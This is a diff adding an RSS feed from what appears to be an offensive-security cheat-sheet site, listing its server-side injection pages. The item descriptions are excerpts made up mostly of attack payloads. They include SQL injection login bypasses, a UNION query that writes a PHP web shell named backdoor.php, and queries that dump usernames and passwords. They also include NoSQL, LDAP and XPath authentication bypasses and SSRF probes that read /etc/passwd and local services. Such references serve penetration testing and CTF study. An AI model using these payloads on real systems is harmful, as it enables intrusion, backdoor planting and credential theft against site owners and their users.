@@ -1,0 +1,63 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Server Side Injections on Offensive Security Cheatsheet</title>
+    <link>/web-attacks/server-side-injections/</link>
+    <description>Recent content in Server Side Injections on Offensive Security Cheatsheet</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    
+	<atom:link href="/web-attacks/server-side-injections/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>SQL Injections</title>
+      <link>/web-attacks/server-side-injections/sql/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/server-side-injections/sql/</guid>
+      <description>Resources https://websec.wordpress.com/tag/sql-filter-bypass/ # Cheat sheet https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md  
+General and Tricks # Classical test &#39; or 1=1 LIMIT 1 -- &#39; or 1=1 LIMIT 1 -- - &#39; or 1=1 LIMIT 1# &#39;or 1# &#39; or 1=1 -- &#39; or 1=1 -- - admin\&#39;-- -  # Upload file union all select 1,2,3,4,&amp;quot;&amp;lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&amp;gt;&amp;quot;,6 into OUTFILE &#39;c:/inetpub/wwwroot/backdoor.php&#39;  # Passwords uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users  # Dump In One Shot (Shoot): \&#39; unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.</description>
+    </item>
+    
+    <item>
+      <title>NoSQL Injections</title>
+      <link>/web-attacks/server-side-injections/nosql/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/server-side-injections/nosql/</guid>
+      <description>Basic Authentication index.php?login[$regex]=a.*&amp;amp;pass[$ne]=lol index.php?login[$gt]=admin&amp;amp;login[$lt]=test&amp;amp;pass[$ne]=1 # Basic NoSQL Injection http://url?login[$nin][]=admin&amp;amp;login[$nin][]=test&amp;amp;pass[$ne]=toto 
+Blind NoSQL Injection # Get size index.php ?chall_name=nosqlblind&amp;amp;flag[$regex]=.1 # Enumeration index.php ?</description>
+    </item>
+    
+    <item>
+      <title>LDAP Injections</title>
+      <link>/web-attacks/server-side-injections/ldap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/server-side-injections/ldap/</guid>
+      <description> Basic LDAP Injection # Classical request : (&amp;amp;(uid=)(userPassword=)) # So result is TRUE if uid AND userPassword are true # You can put ‘)’ in request to crash and see the request username : *)(|(uid=* password : ) → (&amp;amp;(uid=*)(|(uid=*)(userPassword=))) OR username=* password=*)(&amp;amp; → (&amp;amp;(uid=*)(userPassword=*)(&amp;amp;)) 
+Blind LDAP Injection # You have to find/imagine how is the request built # test using only a char → OK → request is (mail=*[texte]*) # You can try (mail=*)(sn=*) → )(sn= → OK # Then, the password attribute (mail=*)(password=*) → OK @*)(password=x → FALSE @*)(password=d → TRUE # You can the enumerate each char</description>
+    </item>
+    
+    <item>
+      <title>XPath Injections</title>
+      <link>/web-attacks/server-side-injections/xpath/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/server-side-injections/xpath/</guid>
+      <description>Basic authentication bypass # XPath login/password often works as follow # $xpath = &amp;quot;//user[user=&#39;&amp;quot; . $_GET[&#39;user&#39;] . &amp;quot;&#39; and pass=&#39;&amp;quot; . $_GET[&#39;pass&#39;] . &amp;quot;&#39;]&amp;quot;; # You can make the 2 conds TRUE and log with the first user user=&#39; or &#39;1&#39;=&#39;1&amp;amp;pass=&#39; or &#39;1&#39;=&#39;1 # Log using a specific user //user[username=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;truc&#39;] ⇒ John&#39; or &#39;1&#39;=&#39;1 # Bypass the password (because of the ‘=’) &#39; or username=&#39;John&#39; or &#39;&#39;=&#39;</description>
+    </item>
+    
+    <item>
+      <title>Server Side Request Forgery (SSRF)</title>
+      <link>/web-attacks/server-side-injections/ssrf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/server-side-injections/ssrf/</guid>
+      <description>https://vinc.top/2016/11/24/server-side-request-forgery 
+PoC and enumeration # It is possible to prove the vulnerability by reading local files # Using the file protocol url=file:///etc/passwd # Then you can enumerate local services that are listening # Depending on the response http://localhost:&amp;lt;port&amp;gt; # It is also possible to use others protocols like gopher and dict # They don&amp;#39;t send HTTP headers and can avoid misinterpretation gopher://127.0.0.1:6379/test # Filter bypass http://127.1 instead of http://127.</description>
+    </item>
+    
+  </channel>
+</rss>
